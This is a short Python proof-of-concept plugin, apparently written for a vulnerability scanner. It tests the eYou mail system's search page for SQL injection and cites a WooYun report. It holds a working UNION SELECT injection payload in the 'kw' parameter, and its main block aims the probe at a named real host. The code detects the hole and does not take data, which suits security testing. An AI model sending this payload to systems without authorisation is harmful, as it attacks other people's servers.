#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:eYou邮件系统问题搜索功能SQL注射漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2014-074260

def assign(service,arg):
    if service=="eyou":
        return True,arg 
    

def  audit(arg):
    
    url=arg+"user/?q=help&type=search&page=1&kw=-1%22)%20UNION%20ALL%20SELECT%201,2,3,concat(0x7c,MD5(1)),5,6,7%23"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
        security_hole(url)
       

if __name__=="__main__":
    from dummy import *
    audit(assign('eyou','http://mail.ecu.com.cn/')[1])